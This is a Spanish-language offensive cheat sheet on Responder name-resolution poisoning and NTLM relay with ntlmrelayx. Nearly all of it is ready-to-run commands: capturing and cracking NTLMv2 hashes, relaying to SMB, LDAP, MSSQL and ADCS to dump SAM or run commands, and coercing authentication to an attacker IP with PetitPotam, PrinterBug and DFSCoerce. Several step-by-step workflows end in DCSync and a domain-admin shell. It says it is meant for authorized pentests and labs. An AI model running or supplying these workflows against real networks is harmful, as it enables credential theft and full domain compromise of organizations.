# Responder & NTLM Relay — Network Poisoning & Credential Capture

Responder envenena protocolos de resolución de nombres (LLMNR, NBT-NS, mDNS) para capturar hashes NTLMv2. ntlmrelayx relay esos hashes a servicios sin crackearlos.

**Contexto:** Uso en pentesting autorizado de redes internas, CTFs, y laboratorios de seguridad.

---

## Responder — Captura de Hashes

### Concepto
```
1. Víctima intenta resolver nombre inexistente (ej: \\typo-server\share)
2. DNS no resuelve → fallback a LLMNR/NBT-NS (broadcast)
3. Responder responde: "Soy yo, ese server"
4. Víctima envía credenciales NTLMv2 al autenticar
5. Responder captura el hash
```

### Uso Básico
```bash
# Iniciar Responder en interfaz
sudo responder -I eth0

# Con análisis mode (solo escuchar, no envenenar)
sudo responder -I eth0 -A

# Con verbose
sudo responder -I eth0 -v

# Con logging detallado
sudo responder -I eth0 -v -f

# Deshabilitar servidores específicos (para relay)
sudo responder -I eth0 -v --disable-ess
```

### Configuración (/etc/responder/Responder.conf)
```ini
[Responder Core]
; Servidores a habilitar/deshabilitar
SQL = On
SMB = On          # Captura SMB hashes
HTTP = On         # Captura HTTP auth
HTTPS = On
FTP = On
LDAP = On
DNS = On
Kerberos = On

; Para NTLM relay, DESHABILITAR SMB y HTTP:
; SMB = Off
; HTTP = Off
```

### Hashes Capturados
```bash
# Location de hashes capturados
/usr/share/responder/logs/

# Formato del hash NTLMv2:
# user::DOMAIN:challenge:response:blob

# Crackear con hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Crackear con john
john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## NTLM Relay — Relay sin Crackear

### Concepto
```
1. Víctima intenta autenticarse (trigger por Responder, PetitPotam, etc.)
2. ntlmrelayx intercepta la autenticación
3. Relay el hash a otro servicio donde el usuario tiene privilegios
4. Ejecuta acción con los privilegios del usuario
```

### Requisitos
- SMB signing DESHABILITADO en el target (verificar con CrackMapExec)
- Responder con SMB y HTTP deshabilitados (para no competir)

### Verificar SMB Signing
```bash
# Encontrar hosts sin SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# O con nmap
nmap --script=smb2-security-mode -p 445 192.168.1.0/24
```

### ntlmrelayx.py — Configuración

```bash
# Relay a SMB (ejecutar comando)
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'

# Relay a SMB (dump SAM)
ntlmrelayx.py -tf targets.txt -smb2support --sam

# Relay a SMB (shell interactiva via socks)
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Relay a LDAP (agregar computer account para RBCD)
ntlmrelayx.py -t ldap://<DC_IP> --delegate-access

# Relay a LDAP (shadow credentials)
ntlmrelayx.py -t ldap://<DC_IP> --shadow-credentials

# Relay a LDAP (dump domain info)
ntlmrelayx.py -t ldap://<DC_IP> --dump-domain

# Relay a ADCS HTTP enrollment (ESC8)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template 'Machine'

# Relay a MSSQL
ntlmrelayx.py -t mssql://<target> -smb2support -q "SELECT @@version"

# Target específico (no archivo)
ntlmrelayx.py -t smb://<target> -smb2support

# IPv6
ntlmrelayx.py -6 -tf targets.txt -smb2support
```

### SOCKs Proxy Mode
```bash
# Iniciar relay con socks
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Ver sesiones activas
ntlmrelayx> socks
# Output muestra: target, user, admin status

# Usar sesión relayed (configura proxychains con socks5 127.0.0.1 1080)
proxychains crackmapexec smb <target> -u '' -p '' --shares
proxychains secretsdump.py domain/user@<target>
```

---

## Triggers — Forzar Autenticación NTLM

### PetitPotam (MS-EFSRPC)
```bash
# Forzar DC a autenticarse contra tu máquina
python3 PetitPotam.py <attacker_IP> <DC_IP>

# Con credenciales
python3 PetitPotam.py -u user -p password -d domain <attacker_IP> <DC_IP>

# Sin credenciales (unauthenticated, parcheado pero a veces funciona)
python3 PetitPotam.py <attacker_IP> <DC_IP>
```

### PrinterBug / SpoolService (MS-RPRN)
```bash
# Forzar autenticación via Print Spooler
python3 printerbug.py domain/user:password@<target> <attacker_IP>

# Verificar si SpoolService está activo
rpcdump.py domain/user:password@<target> | grep MS-RPRN
```

### DFSCoerce (MS-DFSNM)
```bash
python3 dfscoerce.py -u user -p password -d domain <attacker_IP> <target>
```

### WebDAV + SearchConnector
```bash
# Si WebDAV está habilitado en el target
# Crear SearchConnector file que apunte a attacker
# Fuerza auth cuando el usuario abre la carpeta
```

---

## Workflows Completos

### Workflow 1: Responder → Crack Hashes
```bash
# 1. Envenenar red
sudo responder -I eth0 -v

# 2. Esperar hashes (o provocar tráfico)

# 3. Crackear
hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt
```

### Workflow 2: Relay a SMB → Shell
```bash
# 1. Encontrar targets sin SMB signing
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# 2. Configurar Responder (SMB y HTTP OFF en config)
# En /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# 3. Iniciar Responder
sudo responder -I eth0 -v

# 4. Iniciar relay
ntlmrelayx.py -tf targets.txt -smb2support --sam

# 5. Esperar que alguien falle un lookup → relay → dump SAM
```

### Workflow 3: PetitPotam → ADCS → DA
```bash
# 1. Verificar ADCS enrollment endpoint
# http://<CA>/certsrv/

# 2. Iniciar relay a ADCS
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'

# 3. Trigger PetitPotam contra DC
python3 PetitPotam.py <attacker_IP> <DC_IP>

# 4. ntlmrelayx obtiene certificado del DC
# Output: Base64 certificate

# 5. Autenticar con certificado
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
# → NT hash del DC machine account

# 6. DCSync
secretsdump.py domain/'DC$'@<DC_IP> -hashes ':<hash>'
```

### Workflow 4: Relay a LDAP → RBCD → DA
```bash
# 1. Relay a LDAP con delegate-access
ntlmrelayx.py -t ldap://<DC_IP> --delegate-access -smb2support

# 2. Trigger auth (PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py <attacker_IP> <target_with_admin_rights>

# 3. ntlmrelayx crea computer account y configura RBCD

# 4. Obtener ST con impersonation
getST.py domain/'CREATED_COMPUTER$':'password' -dc-ip <DC_IP> \
  -spn cifs/<target> -impersonate administrator

# 5. Usar ticket
export KRB5CCNAME=administrator.ccache
psexec.py domain/administrator@<target> -k -no-pass
```

---

## Tips

- **SMB signing en DCs** — siempre habilitado por default, no se puede relay a DCs vía SMB (pero sí a LDAP)
- **Responder + ntlmrelayx juntos** — deshabilitar SMB/HTTP en Responder para no competir con relay
- **IPv6** — muchas redes tienen IPv6 habilitado sin monitoreo, usar `mitm6` + ntlmrelayx
- **ADCS relay (ESC8)** — el ataque más devastador actualmente si Web Enrollment está habilitado
- **Análisis mode primero** — usar `responder -A` para ver qué protocolos se usan antes de envenenar
- **Net-NTLMv1 vs v2** — si capturas NTLMv1, se puede convertir a NTLM hash sin cracking (rainbow tables)
- **Paciencia** — en engagements reales, dejar Responder corriendo horas o overnight para capturar más hashes
